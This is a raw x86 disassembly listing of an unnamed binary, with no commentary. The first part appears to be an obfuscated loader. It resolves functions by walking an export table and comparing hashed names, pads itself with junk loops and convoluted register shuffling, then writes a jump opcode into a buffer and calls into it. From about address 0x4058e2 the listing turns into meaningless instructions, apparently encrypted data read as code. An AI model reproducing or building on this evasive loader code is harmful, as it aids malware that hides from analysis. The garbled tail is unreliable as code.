  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [esi+0x342bd054],edx
  4058f3:	pop    edi
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	sbb    cl,BYTE PTR [edx+0x410b0cc3]
  405900:	jle    0x405969
  405902:	mov    esp,0xd2d63c9f
  405907:	adc    ecx,DWORD PTR [ecx]
  405909:	subps  xmm4,XMMWORD PTR [edx+edx*2-0x3f2378cc]
  405911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405912:	pop    ss
  405913:	(bad)  [esi+0x5a07bdff]
  405919:	iret   
  40591a:	mov    edx,0x9e60ca3a
  40591f:	pushf  
  405920:	call   0x1a5d:0xa3c48c87
  405927:	cmp    ah,cl
  405929:	add    edx,DWORD PTR [edx+0x47]
  40592c:	mov    ebx,0xe3a6fdd5
  405931:	sbb    DWORD PTR [ebx],ebp
  405933:	push   0x24
  405935:	sub    ecx,DWORD PTR [ecx-0x1a]
  405938:	dec    esi
  405939:	test   bl,bh
  40593b:	cmp    dl,dh
  40593d:	jno    0x4059af
  40593f:	cmp    DWORD PTR [ebx+0x55],edx
  405942:	sub    esi,DWORD PTR [ebp+0x44]
  405945:	inc    ebx
  405946:	mov    ah,0x3e
  405948:	int    0x1
  40594a:	jmp    0x6965f5f7
  40594f:	imul   edx,DWORD PTR [ebx],0x7d4552b
  405955:	sbb    bh,BYTE PTR [ebx-0x3a]
  405958:	jo     0x40598a
  40595a:	inc    ebp
  40595b:	clc    
  40595c:	push   esi
  40595d:	and    DWORD PTR [eax-0x4f],esi
  405960:	inc    edi
  405961:	sub    BYTE PTR [edi+0x6b],0xf7
  405965:	sbb    DWORD PTR [edx-0x5a35485f],edi
  40596b:	sti    
  40596c:	adc    edx,DWORD PTR [esi+ebx*2-0x22955ffc]
  405973:	leave  
  405974:	pop    edx
  405975:	mov    cl,0x70
  405977:	jge    0x4058fe
  405979:	adc    esi,DWORD PTR [ebx+eiz*4+0x322093d3]
  405980:	scas   eax,DWORD PTR es:[edi]
  405981:	test   al,0x9e
  405983:	fsubp  st(0),st
  405985:	stos   DWORD PTR es:[edi],eax
  405986:	xor    eax,0xeace3f86
  40598b:	lock pop edx
  40598d:	dec    ebx
  40598e:	sbb    BYTE PTR [ebp-0x33b89b83],0x52
  405995:	jge    0x40599b
  405997:	popa   
  405998:	mov    esi,0x5b71951e
  40599d:	retf   
  40599e:	add    eax,0x776b54bd
  4059a3:	xchg   edi,eax
  4059a4:	fiadd  WORD PTR [esi-0x69733218]
  4059aa:	mov    dh,0x16
  4059ac:	gs or  eax,0xf5c11e4c
  4059b2:	movd   mm6,DWORD PTR [ebx+ecx*2-0x38]
  4059b7:	test   al,0x4d
  4059b9:	and    ch,BYTE PTR [edx]
  4059bb:	jns    0x405a35
  4059bd:	xchg   esp,eax
  4059be:	ja     0x405a09
  4059c0:	xor    BYTE PTR [edi+0x7320febc],ch
  4059c6:	popa   
  4059c7:	call   0x3e9f8bdc
  4059cc:	push   ss
  4059cd:	pop    ds
  4059ce:	inc    ebx
  4059cf:	(bad)  
  4059d0:	loope  0x405966
  4059d2:	retf   0xce20
  4059d5:	fucomi st,st(1)
  4059d7:	(bad)  
  4059d8:	mov    al,ds:0xc1011566
  4059dd:	add    ecx,DWORD PTR [ebx+0x2]
  4059e0:	cld    
  4059e1:	(bad)  
  4059e2:	bound  eax,QWORD PTR [ebp-0x7b]
  4059e5:	test   DWORD PTR [eax],0x4ca4d586
  4059eb:	push   edx
  4059ec:	lds    edx,FWORD PTR [ebx]
  4059ee:	in     eax,dx
  4059ef:	mov    fs,WORD PTR [edx-0xaa73d63]
  4059f5:	fwait
  4059f6:	rol    DWORD PTR [ebx],0xdc
  4059f9:	ins    BYTE PTR es:[edi],dx
  4059fa:	pop    ecx
  4059fb:	sub    al,0xa3
  4059fd:	bound  eax,QWORD PTR [edi+0x17]
  405a00:	sbb    DWORD PTR [edi+0x79],0xd3bcdcf8
  405a07:	mov    ebx,0xd4133cc3
  405a0c:	pop    ebx
  405a0d:	popa   
  405a0e:	sbb    eax,0xa9b20d7
  405a13:	or     ecx,esi
  405a15:	mov    ebp,0x267d4622
  405a1a:	adc    bh,BYTE PTR [edx-0x7f19cb80]
  405a20:	nop
  405a21:	mov    bh,ah
  405a23:	ins    DWORD PTR es:[edi],dx
  405a24:	pushf  
  405a25:	add    al,0x1b
  405a27:	sub    al,0xf1
  405a29:	fmul   DWORD PTR [edi]
  405a2b:	dec    ebx
  405a2c:	hlt    
  405a2d:	je     0x405aa2
  405a2f:	push   ecx
  405a30:	xchg   BYTE PTR [eax+0x66],bh
  405a33:	cmp    BYTE PTR [ebp-0x4a],0x8f
  405a37:	in     eax,0x7d
  405a39:	test   BYTE PTR [eax],bh
  405a3b:	leave  
  405a3c:	xchg   ebx,eax
  405a3d:	mov    dl,0xfb
  405a3f:	jno    0x405a03
  405a41:	call   0xd19cd747
  405a46:	dec    DWORD PTR [ebx-0x4b]
  405a49:	in     eax,dx
  405a4a:	lods   al,BYTE PTR ds:[esi]
  405a4b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a4d:	rol    BYTE PTR [edx],0x26
  405a50:	mov    al,0x47
  405a52:	nop
  405a53:	mov    cl,0x7d
  405a55:	repz imul ecx,DWORD PTR [ebx-0x69],0xffffff82
  405a5a:	and    al,0x94
  405a5c:	add    al,0xea
  405a5e:	test   BYTE PTR [ebp-0x58643adc],cl
  405a64:	fld    st(2)
  405a66:	popf   
  405a67:	test   DWORD PTR [edx+0x2bcf6b0d],ecx
  405a6d:	popa   
  405a6e:	(bad)  
  405a6f:	pop    ebp
  405a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a71:	dec    esi
  405a72:	hlt    
  405a73:	inc    esi
  405a74:	inc    ecx
  405a75:	xchg   esi,eax
  405a76:	xchg   esp,eax
  405a77:	fidivr DWORD PTR [eax-0x5df1ba6c]
  405a7d:	(bad)  
  405a7e:	xor    DWORD PTR [ebx],edi
  405a80:	jg     0x405a1c
  405a82:	cmp    al,0x23
  405a84:	stc    
  405a85:	sbb    al,0xf8
  405a87:	push   ss
  405a88:	xor    eax,0xfd04bbc9
  405a8d:	outs   dx,DWORD PTR ds:[esi]
  405a8e:	shl    BYTE PTR [ebx+0x69],0xa6
  405a92:	in     al,0xcb
  405a94:	sub    eax,0xd6f307d0
  405a99:	xchg   edi,eax
  405a9a:	mov    al,0xf3
  405a9c:	xchg   esp,eax
  405a9d:	int    0x8
  405a9f:	dec    edi
  405aa0:	fld    QWORD PTR [esi-0x56e09aa5]
  405aa6:	xor    BYTE PTR [eax+0x71fc0fb6],0xf2
  405aad:	and    BYTE PTR [eax-0x1b],bl
  405ab0:	ficom  DWORD PTR [ebx+0x2b01acb1]
  405ab6:	cmp    eax,0x6d2c82fc
  405abb:	loope  0x405b1d
  405abd:	jmp    0x405b35
  405abf:	je     0x405a57
  405ac1:	or     al,0x8f
  405ac3:	(bad)  
  405ac4:	jl     0x405a96
  405ac6:	push   ss
  405ac7:	shl    BYTE PTR [edi-0x6bc6b0a0],1
  405acd:	dec    esi
  405ace:	add    BYTE PTR [ecx+0x28d5f88e],ch
  405ad4:	sbb    al,0x85
  405ad6:	jno    0x405ad3
  405ad8:	push   eax
  405ad9:	sub    BYTE PTR [ecx+0x41],cl
  405adc:	push   0xc749b5bb
  405ae1:	imul   BYTE PTR [edi-0x2ec14df9]
  405ae7:	push   es
  405ae8:	jb     0x405aa6
  405aea:	mov    eax,ds:0xb1d8250c
  405aef:	add    eax,0xccb019e6
  405af4:	jge    0x405b05
  405af6:	push   edi
  405af7:	lea    ecx,[edi+0xc]
  405afa:	pop    edx
  405afb:	les    ebp,FWORD PTR [ebx]
  405afd:	inc    ebp
  405afe:	push   cs
  405aff:	push   edx
  405b00:	clc    
  405b01:	push   esi
  405b02:	cdq    
  405b03:	mov    cl,0xa8
  405b05:	repz int3 
  405b07:	outs   dx,BYTE PTR ds:[esi]
  405b08:	stos   BYTE PTR es:[edi],al
  405b09:	loope  0x405b7a
  405b0b:	loope  0x405b62
  405b0d:	jmp    0x405b3e
  405b0f:	clc    
  405b10:	stos   DWORD PTR es:[edi],eax
  405b11:	and    cl,ch
  405b13:	lock cmp ah,BYTE PTR [esi-0x46]
  405b17:	xor    esi,DWORD PTR [edx-0x11]
  405b1a:	daa    
